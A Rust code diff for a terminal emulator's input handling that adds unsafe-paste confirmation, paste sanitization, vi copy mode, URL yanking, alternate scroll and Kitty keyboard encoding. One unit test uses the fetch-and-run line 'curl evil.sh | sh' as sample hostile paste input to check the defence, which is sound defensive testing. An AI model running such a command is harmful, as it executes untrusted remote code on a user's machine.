@@ -5,8 +5,9 @@ use crate::error::Result;
 use crate::pane::colon_command::{
     execute_colon_command, execute_wm_colon_command, parse_colon_command,
 };
-use crate::pane::{CompositePane, PromptAnchor, PromptMouseDrag};
+use crate::pane::{CompositePane, CopySelectionKind, PromptAnchor, PromptMouseDrag};
 use crate::pty::line_discipline::InputRoutingMode;
+use crate::vt::{encode_osc52_clipboard, is_unsafe_paste, sanitize_paste_bytes};
 use crate::wm::split_tree::SplitDirection;
 use crate::wm::{encode_sgr_mouse_local, WindowManager};
 
@@ -30,6 +31,16 @@ pub fn handle_key_event(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAc
         return Ok(AppAction::Quit);
     }
 
+    // If an unsafe raw PTY paste is awaiting user confirmation (FND-01), route keys to the modal first
+    if pane.pending_unsafe_paste.is_some() {
+        return handle_unsafe_paste_modal_key(pane, key);
+    }
+
+    // If keyboard-driven Vi Copy Mode is active on the OutputCanvas (VAL-04), route keys to it first
+    if pane.copy_mode.active {
+        return handle_copy_mode_key(pane, key);
+    }
+
     // If fuzzy history search is active, route keys to fuzzy search modal first
     if pane.is_prompt_visible() && pane.prompt.fuzzy_search.active {
         return handle_fuzzy_search_key(pane, key);
@@ -48,7 +59,7 @@ pub fn handle_key_event(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAc
         return Ok(AppAction::Handled);
     }
 
-    // Intra-pane prompt positioning, height resize, and OSC 133 command-block jump hotkeys
+    // Intra-pane prompt positioning, height resize, search, copy mode, and OSC 133 command-block jump hotkeys
     if key.modifiers.contains(KeyModifiers::ALT) {
         match key.code {
             KeyCode::Char('t') => {
@@ -61,6 +72,28 @@ pub fn handle_key_event(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAc
             }
             KeyCode::Char('s') => {
                 pane.toggle_split_prompt();
+                return Ok(AppAction::Handled);
+            }
+            KeyCode::Char('c') => {
+                if pane.copy_mode.active {
+                    pane.exit_copy_mode();
+                } else {
+                    pane.enter_copy_mode();
+                }
+                return Ok(AppAction::Handled);
+            }
+            KeyCode::Char('/') => {
+                if pane.is_prompt_visible() {
+                    pane.prompt.set_text(":search ");
+                }
+                return Ok(AppAction::Handled);
+            }
+            KeyCode::Char('n') => {
+                pane.next_canvas_search_match();
+                return Ok(AppAction::Handled);
+            }
+            KeyCode::Char('N') => {
+                pane.prev_canvas_search_match();
                 return Ok(AppAction::Handled);
             }
             KeyCode::Up => {
@@ -126,15 +159,123 @@ pub fn handle_key_event(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAc
     match pane.effective_routing_mode() {
         InputRoutingMode::CommandPrompt => handle_command_prompt_key(pane, key),
         InputRoutingMode::RawPtyPassthrough => {
-            let bytes = encode_key_to_pty_bytes_with_modes(key, pane.vt.is_application_cursor());
-            if !bytes.is_empty() {
-                if let Some(pty) = &pane.pty {
-                    pty.write_all(&bytes)?;
-                }
+            let bytes = encode_key_to_pty_bytes_full(
+                key,
+                pane.vt.is_application_cursor(),
+                pane.vt.is_backarrow_key_67(),
+                pane.vt.kitty_keyboard_flags(),
+            );
+            if !bytes.is_empty()
+                && let Some(pty) = &pane.pty
+            {
+                pty.write_all(&bytes)?;
             }
             Ok(AppAction::Handled)
         }
     }
+}
+
+fn handle_unsafe_paste_modal_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
+    match key.code {
+        KeyCode::Char('y') | KeyCode::Char('Y') | KeyCode::Enter => {
+            if let Some(payload) = pane.pending_unsafe_paste.take() {
+                let clean = sanitize_paste_bytes(&payload).replace("\x1b[201~", "");
+                if let Some(pty) = &pane.pty {
+                    if pane.vt.is_bracketed_paste() {
+                        let mut framed = Vec::with_capacity(clean.len() + 12);
+                        framed.extend_from_slice(b"\x1b[200~");
+                        framed.extend_from_slice(clean.as_bytes());
+                        framed.extend_from_slice(b"\x1b[201~");
+                        pty.write_all(&framed)?;
+                    } else {
+                        pty.write_all(clean.as_bytes())?;
+                    }
+                }
+                pane.status_message = Some(format!("Confirmed paste ({} chars)", clean.len()));
+            }
+            Ok(AppAction::Handled)
+        }
+        KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Esc => {
+            pane.pending_unsafe_paste = None;
+            pane.status_message = Some("Cancelled unsafe multi-line paste".to_string());
+            Ok(AppAction::Handled)
+        }
+        _ => Ok(AppAction::Handled),
+    }
+}
+
+fn handle_copy_mode_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
+    let (rows, cols) = pane.vt.size();
+    let max_r = rows.saturating_sub(1);
+    let max_c = cols.saturating_sub(1);
+
+    if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('v') {
+        pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
+        pane.copy_mode.selection_kind = CopySelectionKind::Block;
+        pane.status_message = Some("COPY MODE: VISUAL BLOCK (rectangular)".to_string());
+        return Ok(AppAction::Handled);
+    }
+
+    match key.code {
+        KeyCode::Esc | KeyCode::Char('q') => {
+            pane.exit_copy_mode();
+        }
+        KeyCode::Left | KeyCode::Char('h') => {
+            pane.copy_mode.cursor_col = pane.copy_mode.cursor_col.saturating_sub(1);
+        }
+        KeyCode::Right | KeyCode::Char('l') => {
+            pane.copy_mode.cursor_col = (pane.copy_mode.cursor_col + 1).min(max_c);
+        }
+        KeyCode::Up | KeyCode::Char('k') => {
+            if pane.copy_mode.cursor_row > 0 {
+                pane.copy_mode.cursor_row -= 1;
+            } else {
+                pane.vt.scroll_up(1);
+            }
+        }
+        KeyCode::Down | KeyCode::Char('j') => {
+            if pane.copy_mode.cursor_row < max_r {
+                pane.copy_mode.cursor_row += 1;
+            } else {
+                pane.vt.scroll_down(1);
+            }
+        }
+        KeyCode::Home | KeyCode::Char('0') => {
+            pane.copy_mode.cursor_col = 0;
+        }
+        KeyCode::End | KeyCode::Char('$') => {
+            pane.copy_mode.cursor_col = max_c;
+        }
+        KeyCode::Char('w') => {
+            pane.copy_mode.cursor_col = (pane.copy_mode.cursor_col + 5).min(max_c);
+        }
+        KeyCode::Char('b') => {
+            // 'b' toggles Rectangular Block selection when no modifier or moves word back if already in char mode
+            if pane.copy_mode.selection_kind != CopySelectionKind::Block {
+                pane.copy_mode.anchor =
+                    Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
+                pane.copy_mode.selection_kind = CopySelectionKind::Block;
+                pane.status_message = Some("COPY MODE: VISUAL BLOCK (rectangular)".to_string());
+            } else {
+                pane.copy_mode.cursor_col = pane.copy_mode.cursor_col.saturating_sub(5);
+            }
+        }
+        KeyCode::Char('v') => {
+            pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
+            pane.copy_mode.selection_kind = CopySelectionKind::Char;
+            pane.status_message = Some("COPY MODE: VISUAL CHAR".to_string());
+        }
+        KeyCode::Char('V') => {
+            pane.copy_mode.anchor = Some((pane.copy_mode.cursor_row, pane.copy_mode.cursor_col));
+            pane.copy_mode.selection_kind = CopySelectionKind::Line;
+            pane.status_message = Some("COPY MODE: VISUAL LINE".to_string());
+        }
+        KeyCode::Char('y') | KeyCode::Enter => {
+            pane.yank_copy_selection();
+        }
+        _ => {}
+    }
+    Ok(AppAction::Handled)
 }
 
 fn handle_fuzzy_search_key(pane: &mut CompositePane, key: KeyEvent) -> Result<AppAction> {
@@ -391,29 +532,41 @@ fn handle_command_prompt_key(pane: &mut CompositePane, key: KeyEvent) -> Result<
     }
 }
 
-/// Routes a `crossterm::event::Event::Paste` payload (`PTY-04`, `DECSET 2004`).
+/// Routes a `crossterm::event::Event::Paste` payload (`PTY-04`, `DECSET 2004`, `FND-01`).
 ///
-/// - In `CommandPrompt` mode: inserts multi-line text directly into `FloatingPromptState` without
+/// - Always sanitizes dangerous C0/DEL control bytes via `sanitize_paste_bytes` (`FND-01`).
+/// - In `CommandPrompt` mode: inserts sanitized text directly into `FloatingPromptState` without
 ///   auto-executing newlines so the user can inspect/edit pasted scripts before pressing `Enter`.
-/// - In `RawPtyPassthrough` mode: wraps pasted text in `\x1b[200~...\x1b[201~` when the child
-///   program has enabled `DECSET 2004` bracketed paste, or writes raw bytes otherwise.
+/// - In `RawPtyPassthrough` mode: checks `is_unsafe_paste` (unbracketed multi-line paste or embedded
+///   `\x1b[201~` breakout) and stages `pending_unsafe_paste` for user confirmation when unsafe;
+///   otherwise wraps in `\x1b[200~...\x1b[201~` if `DECSET 2004` is active or writes raw bytes.
 pub fn handle_paste_event(pane: &mut CompositePane, pasted_text: &str) -> Result<AppAction> {
     pane.refresh_line_discipline();
+    let sanitized = sanitize_paste_bytes(pasted_text);
     match pane.effective_routing_mode() {
         InputRoutingMode::CommandPrompt => {
-            pane.prompt.insert_str(pasted_text);
+            pane.prompt.insert_str(&sanitized);
             Ok(AppAction::Handled)
         }
         InputRoutingMode::RawPtyPassthrough => {
+            let bracketed = pane.vt.is_bracketed_paste();
+            if is_unsafe_paste(pasted_text, bracketed) {
+                pane.pending_unsafe_paste = Some(pasted_text.to_string());
+                pane.status_message = Some(
+                    "UNSAFE MULTI-LINE PASTE DETECTED: Press [y/Enter] to confirm or [n/Esc] to cancel"
+                        .to_string(),
+                );
+                return Ok(AppAction::Handled);
+            }
             if let Some(pty) = &pane.pty {
-                if pane.vt.is_bracketed_paste() {
-                    let mut framed = Vec::with_capacity(pasted_text.len() + 12);
+                if bracketed {
+                    let mut framed = Vec::with_capacity(sanitized.len() + 12);
                     framed.extend_from_slice(b"\x1b[200~");
-                    framed.extend_from_slice(pasted_text.as_bytes());
+                    framed.extend_from_slice(sanitized.as_bytes());
                     framed.extend_from_slice(b"\x1b[201~");
                     pty.write_all(&framed)?;
                 } else {
-                    pty.write_all(pasted_text.as_bytes())?;
+                    pty.write_all(sanitized.as_bytes())?;
                 }
             }
             Ok(AppAction::Handled)
@@ -421,14 +574,54 @@ pub fn handle_paste_event(pane: &mut CompositePane, pasted_text: &str) -> Result
     }
 }
 
+/// Computes `DECSET ?1007` Mouse Alternate Scroll arrow-key bytes when scrolling inside an
+/// Alternate Screen (`?1049`) program that has not enabled mouse tracking (`less`, `man`, `git log`, `FND-02`).
+pub fn encode_alternate_scroll_wheel(pane: &CompositePane, kind: MouseEventKind) -> Option<Vec<u8>> {
+    if !pane.vt.is_alternate_screen()
+        || pane.vt.is_mouse_sgr_or_tracking()
+        || !pane.vt.is_mouse_alternate_scroll()
+    {
+        return None;
+    }
+    let unit: &[u8] = match kind {
+        MouseEventKind::ScrollUp => {
+            if pane.vt.is_application_cursor() {
+                b"\x1bOA"
+            } else {
+                b"\x1b[A"
+            }
+        }
+        MouseEventKind::ScrollDown => {
+            if pane.vt.is_application_cursor() {
+                b"\x1bOB"
+            } else {
+                b"\x1b[B"
+            }
+        }
+        _ => return None,
+    };
+    let mut out = Vec::with_capacity(unit.len() * 3);
+    for _ in 0..3 {
+        out.extend_from_slice(unit);
+    }
+    Some(out)
+}
+
 /// Routes SGR mouse events for intra-pane floating prompt dragging, height resizing,
-/// `[▲][▼]` pin badge clicks, and canvas scrollback (`PANE-02`, `PANE-03`).
+/// `[▲][▼]` pin badge clicks, `Ctrl+Click` URL yanking (`VAL-03`), `Alt+LeftDrag` rectangular canvas selection (`VAL-04`),
+/// `DECSET ?1007` alternate scroll (`FND-02`), and canvas scrollback (`PANE-02`, `PANE-03`).
 pub fn handle_mouse_event(
     pane: &mut CompositePane,
     mouse: MouseEvent,
     viewport: Rect,
 ) -> Result<AppAction> {
     if !pane.is_prompt_visible() {
+        if let Some(scroll_bytes) = encode_alternate_scroll_wheel(pane, mouse.kind) {
+            if let Some(pty) = &pane.pty {
+                pty.write_all(&scroll_bytes)?;
+            }
+            return Ok(AppAction::Handled);
+        }
         return Ok(AppAction::Continue);
     }
 
@@ -436,9 +629,43 @@ pub fn handle_mouse_event(
     let canvas_rect = pane.canvas_rect(viewport);
     let col = mouse.column;
     let row = mouse.row;
+    let in_prompt = col >= prompt_rect.x
+        && col < prompt_rect.x + prompt_rect.width
+        && row >= prompt_rect.y
+        && row < prompt_rect.y + prompt_rect.height;
+    let in_canvas = col >= canvas_rect.x
+        && col < canvas_rect.x + canvas_rect.width
+        && row >= canvas_rect.y
+        && row < canvas_rect.y + canvas_rect.height;
 
     match mouse.kind {
         MouseEventKind::Down(MouseButton::Left) => {
+            // Ctrl+LeftClick on OutputCanvas: check for URL at clicked cell and yank via OSC 52 (VAL-03)
+            if mouse.modifiers.contains(KeyModifiers::CONTROL) && in_canvas && !in_prompt {
+                let rel_r = row.saturating_sub(canvas_rect.y);
+                let rel_c = col.saturating_sub(canvas_rect.x);
+                if let Some(url) = pane.vt.url_at(rel_r, rel_c) {
+                    let seq = encode_osc52_clipboard(&url);
+                    pane.last_osc52_sequence = Some(seq);
+                    pane.prompt.yank_buffer = url.clone();
+                    pane.status_message = Some(format!("Yanked URL: {url}"));
+                    return Ok(AppAction::Handled);
+                }
+            }
+
+            // Alt+LeftClick on OutputCanvas: start rectangular block selection (VAL-04)
+            if mouse.modifiers.contains(KeyModifiers::ALT) && in_canvas && !in_prompt {
+                let rel_r = row.saturating_sub(canvas_rect.y);
+                let rel_c = col.saturating_sub(canvas_rect.x);
+                pane.copy_mode.active = true;
+                pane.copy_mode.anchor = Some((rel_r, rel_c));
+                pane.copy_mode.cursor_row = rel_r;
+                pane.copy_mode.cursor_col = rel_c;
+                pane.copy_mode.selection_kind = CopySelectionKind::Block;
+                pane.mouse_drag = Some(PromptMouseDrag::CanvasRectSelect);
+                return Ok(AppAction::Handled);
+            }
+
             // Top border of floating prompt: check [▲][▼] pin badges on right side or start vertical move drag
             if row == prompt_rect.y
                 && col >= prompt_rect.x
@@ -532,21 +759,30 @@ pub fn handle_mouse_event(
                         pane.set_prompt_width(Some(new_width.clamp(16, canvas_rect.width.max(16))));
                         return Ok(AppAction::Handled);
                     }
+                    PromptMouseDrag::CanvasRectSelect => {
+                        let rel_r = row
+                            .saturating_sub(canvas_rect.y)
+                            .min(canvas_rect.height.saturating_sub(1));
+                        let rel_c = col
+                            .saturating_sub(canvas_rect.x)
+                            .min(canvas_rect.width.saturating_sub(1));
+                        pane.copy_mode.cursor_row = rel_r;
+                        pane.copy_mode.cursor_col = rel_c;
+                        return Ok(AppAction::Handled);
+                    }
                 }
             }
         }
         MouseEventKind::Up(MouseButton::Left) => {
-            if pane.mouse_drag.take().is_some() {
+            if let Some(drag) = pane.mouse_drag.take() {
+                if drag == PromptMouseDrag::CanvasRectSelect {
+                    let _ = pane.yank_copy_selection();
+                }
                 return Ok(AppAction::Handled);
             }
         }
         MouseEventKind::ScrollUp => {
-            if col >= prompt_rect.x
-                && col < prompt_rect.x + prompt_rect.width
-                && row >= prompt_rect.y
-                && row < prompt_rect.y + prompt_rect.height
-                && pane.prompt.lines.len() > 1
-            {
+            if in_prompt && pane.prompt.lines.len() > 1 {
                 pane.prompt.scroll_up(1);
             } else {
                 pane.vt.scroll_up(3);
@@ -554,12 +790,7 @@ pub fn handle_mouse_event(
             return Ok(AppAction::Handled);
         }
         MouseEventKind::ScrollDown => {
-            if col >= prompt_rect.x
-                && col < prompt_rect.x + prompt_rect.width
-                && row >= prompt_rect.y
-                && row < prompt_rect.y + prompt_rect.height
-                && pane.prompt.lines.len() > 1
-            {
+            if in_prompt && pane.prompt.lines.len() > 1 {
                 pane.prompt.scroll_down(1);
             } else {
                 pane.vt.scroll_down(3);
@@ -693,6 +924,8 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, key: KeyEvent) -> Result<AppA
         && !key.modifiers.contains(KeyModifiers::ALT)
         && wm.active_pane().effective_routing_mode() == InputRoutingMode::CommandPrompt
         && !wm.active_pane().prompt.fuzzy_search.active
+        && !wm.active_pane().copy_mode.active
+        && wm.active_pane().pending_unsafe_paste.is_none()
     {
         let text = wm.active_pane().prompt.text();
         if let Some(cmd_res) = parse_colon_command(&text) {
@@ -715,7 +948,8 @@ pub fn handle_wm_key_event(wm: &mut WindowManager, key: KeyEvent) -> Result<AppA
 }
 
 /// Routes a `MouseEvent` across the multi-pane `WindowManager`, hit-testing in reverse z-order,
-/// selectively raising clicked panes (`WM-02`), and translating global coordinates to local SGR 1006 (`WM-03`).
+/// selectively raising clicked panes (`WM-02`), and translating global coordinates to local SGR 1006 (`WM-03`)
+/// or `DECSET ?1007` alternate scroll (`FND-02`).
 pub fn handle_wm_mouse_event(
     wm: &mut WindowManager,
     mouse: MouseEvent,
@@ -739,7 +973,15 @@ pub fn handle_wm_mouse_event(
     };
 
     if pane.effective_routing_mode() == InputRoutingMode::RawPtyPassthrough {
-        if let Some(sgr_bytes) = encode_sgr_mouse_local(mouse, inner) {
+        // If the child app has not enabled mouse tracking (?1000..1006), check DECSET ?1007 Alternate Scroll first
+        if !pane.vt.is_mouse_sgr_or_tracking() {
+            if let Some(scroll_bytes) = encode_alternate_scroll_wheel(pane, mouse.kind) {
+                if let Some(pty) = &pane.pty {
+                    pty.write_all(&scroll_bytes)?;
+                }
+                return Ok(AppAction::Handled);
+            }
+        } else if let Some(sgr_bytes) = encode_sgr_mouse_local(mouse, inner) {
             if let Some(pty) = &pane.pty {
                 pty.write_all(&sgr_bytes)?;
             }
@@ -757,12 +999,61 @@ pub fn encode_key_to_pty_bytes(key: KeyEvent) -> Vec<u8> {
 
 /// Encodes a `crossterm::event::KeyEvent` into VT100/VT220/xterm escape sequences, respecting `DECCKM` (`?1h`) application cursor mode.
 pub fn encode_key_to_pty_bytes_with_modes(key: KeyEvent, application_cursor: bool) -> Vec<u8> {
-    if key.modifiers.contains(KeyModifiers::CONTROL) {
-        if let KeyCode::Char(c) = key.code {
-            let lower = c.to_ascii_lowercase();
-            if lower.is_ascii_lowercase() {
-                return vec![(lower as u8) - b'a' + 1];
+    encode_key_to_pty_bytes_full(key, application_cursor, false, 0)
+}
+
+/// Encodes a `KeyEvent` into PTY bytes, respecting `DECCKM` (`?1h`), `DECBKM` (`?67h`), and
+/// the Kitty Keyboard Protocol (`CSI u`, `FND-04`).
+pub fn encode_key_to_pty_bytes_full(
+    key: KeyEvent,
+    application_cursor: bool,
+    backarrow_bs: bool,
+    kitty_flags: u8,
+) -> Vec<u8> {
+    // Kitty Keyboard Protocol disambiguate mode (flag bit 0x01 or higher)
+    if kitty_flags > 0 {
+        let mut mod_bits = 0u8;
+        if key.modifiers.contains(KeyModifiers::SHIFT) {
+            mod_bits |= 1;
+        }
+        if key.modifiers.contains(KeyModifiers::ALT) {
+            mod_bits |= 2;
+        }
+        if key.modifiers.contains(KeyModifiers::CONTROL) {
+            mod_bits |= 4;
+        }
+        let mod_param = mod_bits + 1;
+        match key.code {
+            KeyCode::Esc => {
+                return if mod_bits == 0 {
+                    b"\x1b[27u".to_vec()
+                } else {
+                    format!("\x1b[27;{mod_param}u").into_bytes()
+                };
             }
+            KeyCode::Enter if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
+                return format!("\x1b[13;{mod_param}u").into_bytes();
+            }
+            KeyCode::Tab if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
+                return format!("\x1b[9;{mod_param}u").into_bytes();
+            }
+            KeyCode::Backspace if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
+                return format!("\x1b[127;{mod_param}u").into_bytes();
+            }
+            KeyCode::Char(c) if mod_bits > 0 || (kitty_flags & 0x08) != 0 => {
+                let codepoint = c.to_ascii_lowercase() as u32;
+                return format!("\x1b[{codepoint};{mod_param}u").into_bytes();
+            }
+            _ => {}
+        }
+    }
+
+    if key.modifiers.contains(KeyModifiers::CONTROL)
+        && let KeyCode::Char(c) = key.code
+    {
+        let lower = c.to_ascii_lowercase();
+        if lower.is_ascii_lowercase() {
+            return vec![(lower as u8) - b'a' + 1];
         }
     }
 
@@ -779,7 +1070,13 @@ pub fn encode_key_to_pty_bytes_with_modes(key: KeyEvent, application_cursor: boo
             }
         }
         KeyCode::Enter => vec![b'\r'],
-        KeyCode::Backspace => vec![0x7f],
+        KeyCode::Backspace => {
+            if backarrow_bs {
+                vec![0x08]
+            } else {
+                vec![0x7f]
+            }
+        }
         KeyCode::Tab => vec![b'\t'],
         KeyCode::BackTab => b"\x1b[Z".to_vec(),
         KeyCode::Esc => vec![0x1b],
@@ -977,5 +1274,62 @@ mod tests {
         // 4. Paste multiline text into CommandPrompt without auto-executing
         handle_paste_event(&mut pane, "line1\nline2").unwrap();
         assert_eq!(pane.prompt.lines, vec!["line1".to_string(), "line2".to_string()]);
+    }
+
+    #[test]
+    fn unsafe_raw_paste_triggers_confirmation_modal_and_kitty_csi_u_encodes_keys() {
+        let mut pane = CompositePane::new_headless(1, 25, 80);
+        pane.toggle_manual_raw_override();
+        assert_eq!(pane.effective_routing_mode(), InputRoutingMode::RawPtyPassthrough);
+
+        // Unbracketed multi-line paste in RawPtyPassthrough stages pending_unsafe_paste
+        handle_paste_event(&mut pane, "curl evil.sh | sh\n").unwrap();
+        assert!(pane.pending_unsafe_paste.is_some());
+
+        // Pressing 'n' cancels the pending unsafe paste
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE)).unwrap();
+        assert!(pane.pending_unsafe_paste.is_none());
+
+        // Kitty keyboard CSI u encoding
+        let shift_enter = encode_key_to_pty_bytes_full(
+            KeyEvent::new(KeyCode::Enter, KeyModifiers::SHIFT),
+            false,
+            false,
+            1,
+        );
+        assert_eq!(shift_enter, b"\x1b[13;2u");
+        let ctrl_a = encode_key_to_pty_bytes_full(
+            KeyEvent::new(KeyCode::Char('a'), KeyModifiers::CONTROL),
+            false,
+            false,
+            1,
+        );
+        assert_eq!(ctrl_a, b"\x1b[97;5u");
+    }
+
+    #[test]
+    fn decset_1007_alternate_scroll_and_vi_copy_mode_rectangular_selection_work() {
+        let mut pane = CompositePane::new_headless(1, 10, 40);
+        pane.process_pty_output(b"\x1b[?1049h\x1b[?1h");
+        let up_bytes = encode_alternate_scroll_wheel(&pane, MouseEventKind::ScrollUp).unwrap();
+        assert_eq!(up_bytes, b"\x1bOA\x1bOA\x1bOA");
+
+        pane.process_pty_output(b"\x1b[?1049l");
+        pane.process_pty_output(b"ABCD1234\r\nEFGH5678\r\nIJKL9012\r\n");
+
+        // Enter Vi Copy Mode and select a 2x4 rectangular block ("1234\n5678")
+        pane.enter_copy_mode();
+        pane.copy_mode.cursor_row = 0;
+        pane.copy_mode.cursor_col = 4;
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('b'), KeyModifiers::NONE)).unwrap();
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Down, KeyModifiers::NONE)).unwrap();
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Right, KeyModifiers::NONE)).unwrap();
+        handle_key_event(&mut pane, KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE)).unwrap();
+
+        assert!(!pane.copy_mode.active);
+        assert_eq!(pane.prompt.yank_buffer, "1234\n5678");
+        assert!(pane.last_osc52_sequence.is_some());
     }
 }
